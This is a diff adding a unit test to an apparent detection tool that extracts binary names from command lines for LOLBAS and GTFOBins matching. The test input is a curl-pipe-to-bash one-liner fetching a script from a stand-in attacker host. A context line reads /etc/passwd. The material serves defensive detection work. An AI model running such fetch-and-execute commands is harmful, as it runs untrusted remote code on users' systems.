@@ -463,6 +463,17 @@ def test_extract_binaries_keeps_command_position_tokens():
     assert extract_binaries("cat /etc/passwd | grep root") == ["cat", "grep"]
 
 
+def test_extract_binaries_mixes_windows_and_unix_in_pipeline():
+    # `curl | bash` is the textbook one-liner installer pattern. Both
+    # binaries must be extracted so curl gets a LOLBAS hit AND bash
+    # gets a GTFOBins hit.
+    bins = extract_binaries(
+        "curl -fsSL https://cdn.evil.xyz/install.sh | bash -s -- --no-verify"
+    )
+    assert "curl.exe" in bins  # known Windows extensionless binary
+    assert "bash" in bins      # Unix command-position binary after `|`
+
+
 def test_extract_binaries_picks_up_extensionless_lolbins():
     # bitsadmin / certutil are invoked without .exe in nearly every real
     # incident report — they MUST be extracted so the LOLBAS panel can fire.
